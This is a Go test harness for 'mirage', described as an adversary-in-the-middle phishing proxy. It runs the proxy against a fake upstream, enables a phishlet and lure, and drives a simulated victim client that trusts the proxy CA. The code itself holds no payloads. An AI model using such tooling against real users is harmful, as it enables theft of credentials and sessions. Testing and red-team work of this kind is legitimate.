// Package test contains end-to-end integration tests for the mirage AiTM proxy.
// Tests start a real daemon in-process (real TLS, real SQLite, real pipeline)
// against a controllable fake upstream, then assert on session state via the
// SDK client. No subprocess, no Docker, no browser required.
package test

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	"github.com/travisbale/mirage/internal/config"
	"github.com/travisbale/mirage/internal/daemon"
	"github.com/travisbale/mirage/sdk"
)

const (
	testDomain        = "phish.test"
	testAPIHostname   = "api.phish.test"
	testPhishletName  = "testsite"
	testPhishHostname = "login.phish.test"
)

// Harness is a fully-wired test environment. Obtain one via NewHarness.
type Harness struct {
	// Upstream is the fake target website. Tests register handlers on its Mux.
	Upstream    *httptest.Server
	UpstreamMux *http.ServeMux

	// Victim simulates a phishing victim's browser.
	// It trusts the proxy CA, dials the proxy directly, and holds a cookie jar.
	Victim *http.Client

	// API is the management SDK client, authenticated via mTLS.
	API *sdk.Client

	// PhishHost is the phishing hostname tests should send requests to.
	PhishHost string

	// ProxyAddr is the TCP address of the running proxy (e.g. "127.0.0.1:PORT").
	ProxyAddr string
}

// NewHarness starts a full daemon and returns a configured Harness.
// All resources are cleaned up automatically via t.Cleanup.
func NewHarness(t *testing.T) *Harness {
	t.Helper()

	tmpDir := t.TempDir()

	// Fake upstream website.
	mux := http.NewServeMux()
	upstream := httptest.NewTLSServer(mux)
	t.Cleanup(upstream.Close)

	// Write config and phishlet files.
	httpsPort := freePort(t)
	dnsPort := freePort(t)
	cfgPath := writeConfig(t, tmpDir, httpsPort, dnsPort)
	writePhishlet(t, tmpDir)

	// Start daemon.
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)

	d, err := daemon.New(cfgPath, "test", discardLogger())
	if err != nil {
		t.Fatalf("daemon.New: %v", err)
	}

	// Inject upstream transport: always dials the httptest server, skips TLS verify.
	upstreamAddr := upstream.Listener.Addr().String()
	d.SetUpstreamTransport(&http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // test only
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, upstreamAddr)
		},
	})

	go func() {
		d.Run(ctx)
		d.Shutdown()
	}()

	proxyAddr := fmt.Sprintf("127.0.0.1:%d", httpsPort)
	if err := waitForTCP(proxyAddr, 5*time.Second); err != nil {
		t.Fatalf("proxy did not become ready: %v", err)
	}

	// Read certs written to disk by daemon.New.
	proxyCACertPEM, err := os.ReadFile(filepath.Join(tmpDir, "ca", "mirage-ca.crt"))
	if err != nil {
		t.Fatalf("reading proxy CA cert: %v", err)
	}
	operatorCertPEM, err := os.ReadFile(filepath.Join(tmpDir, "operator.crt"))
	if err != nil {
		t.Fatalf("reading operator cert: %v", err)
	}
	operatorKeyPEM, err := os.ReadFile(filepath.Join(tmpDir, "operator.key"))
	if err != nil {
		t.Fatalf("reading operator key: %v", err)
	}

	// Build SDK client. Dials proxyAddr but uses testAPIHostname for SNI/Host.
	apiClient, err := sdk.NewClient(
		"https://"+proxyAddr,
		testAPIHostname,
		operatorCertPEM,
		operatorKeyPEM,
		proxyCACertPEM,
	)
	if err != nil {
		t.Fatalf("sdk.NewClient: %v", err)
	}

	// Enable the test phishlet via the API.
	if _, err := apiClient.EnablePhishlet(testPhishletName, sdk.EnablePhishletRequest{
		Hostname: testPhishHostname,
	}); err != nil {
		t.Fatalf("EnablePhishlet: %v", err)
	}

	// Create a default lure at "/" so victim requests to the root path
	// are treated as valid lure hits and receive a session.
	if _, err := apiClient.CreateLure(sdk.CreateLureRequest{
		Phishlet:    testPhishletName,
		Path:        "/",
		RedirectURL: "https://testsite.internal/",
	}); err != nil {
		t.Fatalf("CreateLure default: %v", err)
	}

	// Build victim client: trusts proxy CA, always dials proxyAddr.
	jar, _ := cookiejar.New(nil)
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(proxyCACertPEM)
	victimClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{RootCAs: pool},
			DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
				return (&net.Dialer{}).DialContext(ctx, network, proxyAddr)
			},
		},
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &Harness{
		Upstream:    upstream,
		UpstreamMux: mux,
		Victim:      victimClient,
		API:         apiClient,
		PhishHost:   testPhishHostname,
		ProxyAddr:   proxyAddr,
	}
}

// VictimGet sends a GET request from the victim client to the given path on the
// phishing hostname. Returns the response; the caller must close the body.
func (h *Harness) VictimGet(t *testing.T, path string) *http.Response {
	t.Helper()

	req, err := http.NewRequest(http.MethodGet, "https://"+h.PhishHost+path, nil)
	if err != nil {
		t.Fatalf("building request: %v", err)
	}

	resp, err := h.Victim.Do(req)
	if err != nil {
		t.Fatalf("GET %s: %v", path, err)
	}

	return resp
}

// VictimPost sends a POST request with application/x-www-form-urlencoded body.
func (h *Harness) VictimPost(t *testing.T, path, body string) *http.Response {
	t.Helper()

	req, err := http.NewRequest(http.MethodPost, "https://"+h.PhishHost+path, newStringBody(body))
	if err != nil {
		t.Fatalf("building request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := h.Victim.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", path, err)
	}

	return resp
}

// VictimPostJSON sends a POST request with application/json body.
func (h *Harness) VictimPostJSON(t *testing.T, path, body string) *http.Response {
	t.Helper()

	req, err := http.NewRequest(http.MethodPost, "https://"+h.PhishHost+path, newStringBody(body))
	if err != nil {
		t.Fatalf("building request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := h.Victim.Do(req)
	if err != nil {
		t.Fatalf("POST JSON %s: %v", path, err)
	}

	return resp
}

// DrainAndClose reads the response body and closes it.
func DrainAndClose(resp *http.Response) {
	io.Copy(io.Discard, resp.Body) //nolint:errcheck
	resp.Body.Close()
}

// ---- setup helpers ----------------------------------------------------------

func writeConfig(t *testing.T, tmpDir string, httpsPort, dnsPort int) string {
	t.Helper()
	cfg := config.Config{
		Domain:       testDomain,
		ExternalIPv4: "127.0.0.1",
		HTTPSPort:    httpsPort,
		DNSPort:      dnsPort,
		DataDir:      tmpDir,
		PhishletsDir: filepath.Join(tmpDir, "phishlets"),
		SelfSigned:   true,
		API: config.APIConfig{
			SecretHostname: testAPIHostname,
		},
	}
	data, err := yaml.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshalling config: %v", err)
	}
	cfgPath := filepath.Join(tmpDir, "miraged.yaml")
	if err := os.WriteFile(cfgPath, data, 0644); err != nil {
		t.Fatalf("writing config: %v", err)
	}
	return cfgPath
}

func writePhishlet(t *testing.T, tmpDir string) {
	t.Helper()
	destDir := filepath.Join(tmpDir, "phishlets")
	if err := os.MkdirAll(destDir, 0755); err != nil {
		t.Fatalf("creating phishlets dir: %v", err)
	}
	src := filepath.Join("testdata", "phishlets", "testsite.yaml")
	data, err := os.ReadFile(src)
	if err != nil {
		t.Fatalf("reading test phishlet: %v", err)
	}
	if err := os.WriteFile(filepath.Join(destDir, "testsite.yaml"), data, 0644); err != nil {
		t.Fatalf("writing test phishlet: %v", err)
	}
}

// freePort binds to :0, reads the OS-assigned port, then closes the listener.
// There is a small TOCTOU window, which is acceptable in sequential tests.
func freePort(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("freePort: %v", err)
	}
	port := l.Addr().(*net.TCPAddr).Port
	l.Close()
	return port
}

func waitForTCP(addr string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", addr, 100*time.Millisecond)
		if err == nil {
			conn.Close()
			return nil
		}
		time.Sleep(50 * time.Millisecond)
	}
	return fmt.Errorf("timed out waiting for %s", addr)
}

func newStringBody(s string) *strings.Reader { return strings.NewReader(s) }

func discardLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}
